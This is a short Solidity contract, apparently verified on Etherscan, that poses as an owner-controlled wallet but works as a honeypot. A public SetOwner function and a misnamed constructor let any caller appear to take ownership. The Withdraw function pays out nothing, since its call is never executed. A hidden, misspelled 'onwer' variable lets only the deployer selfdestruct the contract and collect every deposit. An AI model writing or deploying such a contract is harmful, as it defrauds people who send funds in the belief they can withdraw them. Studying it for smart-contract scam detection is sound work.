/**
 *Submitted for verification at Etherscan.io on 2024-12-28
*/

pragma solidity ^0.4.22;

contract Ownable{
    address internal onwer;
    function Ownable() public {
        onwer = msg.sender;
    }
}

contract SigWallet2_1 is Ownable {

    address public owner;

    function SigWallet2() public {
        owner = msg.sender;
    }
    
    function SetOwner(address _owner) public {
        owner = _owner;
    }

    function Deposit() public payable {}

    function Withdraw() public payable {
        require(owner == msg.sender, "only owner");
        uint256 withdrawAmount = msg.value;
        require(withdrawAmount > 0, "enter amount to withdraw");
        // Transfer
        address to = msg.sender;
        to.call.value(withdrawAmount);
    }

    function TerminateWallet() public {
        require(onwer == msg.sender, "only owner");
        selfdestruct(onwer); 
    }

}